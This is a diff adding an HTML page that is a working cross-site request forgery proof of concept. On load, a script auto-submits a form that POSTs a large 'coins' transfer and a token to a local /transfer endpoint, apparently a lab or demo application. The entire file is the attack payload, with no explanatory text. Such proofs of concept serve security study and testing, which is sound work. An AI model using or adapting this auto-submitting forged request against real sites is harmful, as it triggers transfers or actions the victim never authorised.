@@ -1,0 +1,20 @@
+<html>
+
+<form name="myForm" id="myForm" action="http://localhost:5000/transfer" method="POST">
+    <p>
+        <input name="coins" value="1000000000000" />
+        <input name="token" value="griffy" />
+    </p>
+    <p>
+        <input type="submit" value="Submit" />
+    </p>
+</form>
+
+<script type="text/javascript">
+    window.onload=function(){
+          document.forms["myForm"].submit();
+    }
+</script>
+
+</html>
+
